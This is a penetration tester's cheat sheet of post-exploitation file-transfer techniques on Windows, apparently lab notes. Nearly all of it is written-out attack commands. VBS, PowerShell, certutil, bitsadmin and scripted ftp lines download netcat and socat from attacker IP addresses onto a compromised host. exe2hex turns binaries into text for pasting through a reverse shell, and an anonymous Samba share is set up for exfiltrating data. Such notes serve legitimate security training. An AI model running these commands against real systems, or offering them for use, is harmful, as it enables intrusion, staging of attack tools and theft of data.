# File Transfers
# - windows
#   see also: https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/
#  - VBS (works on oldest windows)
#    WARNING: this particular XHR method keeps temp files you have to cleanup potentially
#    ie. C:/Documents and Settings/LocalService/Local Settings/Temporary Internet Files/Content.IE5/4TUBO96B/socat[1].exe
echo fu="http://192.168.119.198/socat.exe":loc = "c:\windows\temp\socat.exe":Set xhr = CreateObject("MSXML2.XMLHTTP"):xhr.open "GET", fu, false:xhr.send():Set s = CreateObject("ADODB.Stream"):s.Open:s.Type = 1:s.Write xhr.ResponseBody:s.Position = 0:s.SaveToFile loc:s.Close > a.vbs
cscript a.vbs
#  - powershell
#    can basically fetch over http, or various other ways
C:\> powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.17/nc.exe','c:\temp\nc.exe')
#  - certutil
C:\> certutil.exe -urlcache -split -f "http://192.168.119.198/nc.exe" %temp%\nc.exe
#  - nc.exe < file
#    works even with binary files
#  - bitsadmin
bitsadmin /transfer job1 /download /priority normal http://192.168.119.198/socat.exe c:\windows\temp\socat.exe
#  - wget.exe
#  - socat.exe
#    see `socat` notes
#  - meterpreter
#  - upx
#    this kali linux utility will compress windows pe files (.exe) 
#    in a way that makes them still executable (i assume it decompresses at runtime)
$ upx -9 nc.exe
# this kali linux utility will convert a binary to a series of batch+powershell commands
# that can be copy/pasted into a [reverse-]shell to write out a binary to remote disk
$ exe2hex -x nc.exe -p nc.cmd
#   - iexplorer http
#   - tftp (supported <= WinXP,WinSvr2k3)
#   - ftp.exe
#       bad for firewalls because every xfer has to host a listening port. 
#       also ftp.exe keeps ftp command history on windows client side
# temp ftp server (linux)
 $ npx ftp-srv ftp://192.168.119.198:8021 --root /usr/share/windows-resources/binaries/ --username a --password b
# NOTICE: client firewall must be down for random N>1024 port to open.
#         PASV shifts that burden to server, but windows ftp doesn't support it.
# client
C:\> >f  echo open 192.168.119.198 8021
C:\> >>f echo user a
C:\> >>f echo b
C:\> >>f echo bin
C:\> >>f echo get taco
C:\> >>f echo quit
C:\> ftp -v -n -s:f
C:\> del f
# exfiltration over SMB / CIFS Shares
# setup docker samba host (anonymous access `guest`:``)
$ docker run -it -p 445:445 -v /workspace/shared:/data/shared twistify/anonymous-samba
# test locally in finder `smb://192.168.19.38/shared/` to ensure intended files/path are correct
# mount
C:\> net use Z: \\192.168.19.38\shared /PERSISTENT:YES
# unmount
C:\> net use  Z: /delete
# exfil
C:\> echo example >> \\192.168.19.38\shared\out.txt